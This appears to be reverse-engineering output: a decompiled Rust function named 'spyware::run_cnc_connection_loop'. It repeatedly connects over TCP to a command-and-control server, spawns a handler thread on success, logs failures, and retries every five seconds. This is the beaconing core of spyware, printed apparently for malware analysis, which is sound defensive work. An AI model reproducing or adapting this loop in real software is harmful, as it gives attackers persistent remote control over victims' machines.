void _ZN7spyware23run_cnc_connection_loop17h099cfaaaff629944E(void)

{
  long lVar1;
  ulong uVar2;
  undefined4 local_114;
  undefined **local_110;
  undefined8 local_108;
  undefined ***local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined local_e8;
  undefined **local_e0;
  code *local_d8;
  undefined *local_d0;
  undefined *local_c8;
  undefined8 local_c0;
  undefined4 **local_b8;
  code *local_b0;
  byte local_a8 [4];
  undefined4 local_a4;
  undefined4 **local_a0;
  undefined4 **local_98;
  code *local_90;
  undefined8 **local_88;
  undefined *local_80;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined8 local_68;
  undefined4 local_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined8 local_50;
  undefined4 *local_48 [3];
  
  do {
    local_e0 = &PTR_DAT_001b93a8;
    local_d8 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h412b806372427b66E;
    local_d0 = &DAT_0011281a;
    local_c8 = 
    PTR__ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_u16_GT_3fmt17hca7847b10460df25E_001be650
    ;
    local_110 = (undefined **)&DAT_001b9348;
    local_108 = 2;
    local_f0 = 0;
    local_f8 = 2;
    local_100 = &local_e0;
    _ZN4core6option15Option_LT_T_GT_11map_or_else17h31b26472792d6da3E(&local_60,&local_110);
    local_78 = local_60;
    uStack_74 = uStack_5c;
    uStack_70 = uStack_58;
    uStack_6c = uStack_54;
    local_68 = local_50;
                    /* try { // try from 00151bec to 00151bf8 has its CatchHandler @ 00151e32 */
    _ZN3std3net3tcp9TcpStream7connect17h95ced5f18ca8792fE(local_a8,&local_78);
    if ((local_a8[0] & 1) == 0) {
      local_114 = local_a4;
      uVar2 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
      if (2 < uVar2) {
                    /* try { // try from 00151cf7 to 00151d24 has its CatchHandler @ 00151e22 */
        (*(code *)PTR__ZN3std3net3tcp9TcpStream9peer_addr17h9ccf6949693ba95cE_001be628)
                  (&local_110,&local_114);
        _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hde1314fe5351d8d1E(&local_98,&local_110);
        _ZN49__LT_T_u20_as_u20_alloc__string__SpecToString_GT_14spec_to_string17hb4d4415e985a544cE
                  (local_48,&local_98);
        local_b0 = 
        _ZN60__LT_alloc__string__String_u20_as_u20_core__fmt__Display_GT_3fmt17h9e2c9c436a613463E;
        local_110 = &PTR_DAT_001b9368;
        local_108 = 2;
        local_f0 = 0;
        local_f8 = 1;
        local_100 = (undefined ***)&local_b8;
        local_b8 = local_48;
                    /* try { // try from 00151d62 to 00151d9f has its CatchHandler @ 00151e01 */
        local_c0 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                             (&PTR_DAT_001b93d0);
        local_e0 = (undefined **)&DAT_001127b8;
        local_d8 = (code *)0x7;
        local_d0 = &DAT_001127b8;
        local_c8 = &DAT_00000007;
        _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_110,3,&local_e0);
                    /* try { // try from 00151da0 to 00151da7 has its CatchHandler @ 00151e22 */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h46afe0b9deda2fc5E(local_48);
      }
      local_100 = (undefined ***)0x8000000000000000;
      local_110 = (undefined **)0x0;
      local_e8 = 0;
                    /* try { // try from 00151dc9 to 00151de6 has its CatchHandler @ 00151e30 */
      _ZN3std6thread7Builder15spawn_unchecked17h9fd01dc985f8c9d4E(&local_e0,&local_110,local_114);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h0214701cb0e2f56bE(&local_110,&local_e0);
      _ZN4core3ptr112drop_in_place_LT_std__thread__JoinHandle_LT_core__result__Result_LT__LP__RP__C_std__io__error__Error_GT__GT__GT_17hc1f2d39e06124517E
                (&local_110);
    }
    else {
      local_b8 = local_a0;
      lVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
      if (lVar1 != 0) {
        local_90 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h5f99fd476a35f039E;
        local_80 = 
        PTR__ZN60__LT_std__io__error__Error_u20_as_u20_core__fmt__Display_GT_3fmt17hcf0c0103019d8a0aE_001be638
        ;
        local_110 = &PTR_DAT_001b9388;
        local_108 = 2;
        local_f0 = 0;
        local_100 = (undefined ***)&local_98;
        local_f8 = 2;
        local_98 = local_48;
        local_88 = &local_b8;
        local_48[0] = &local_78;
                    /* try { // try from 00151c86 to 00151cc3 has its CatchHandler @ 00151e13 */
        local_c0 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                             (&PTR_DAT_001b9400);
        local_e0 = (undefined **)&DAT_001127b8;
        local_d8 = (code *)0x7;
        local_d0 = &DAT_001127b8;
        local_c8 = &DAT_00000007;
        _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_110,1,&local_e0);
      }
                    /* try { // try from 00151cc4 to 00151ccb has its CatchHandler @ 00151e32 */
      _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_b8);
    }
                    /* try { // try from 00151de7 to 00151df3 has its CatchHandler @ 00151e32 */
    (*(code *)PTR__ZN3std6thread5sleep17h1a6eeffe1c923e1fE_001be730)(5,0);
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h46afe0b9deda2fc5E(&local_78);
  } while( true );
}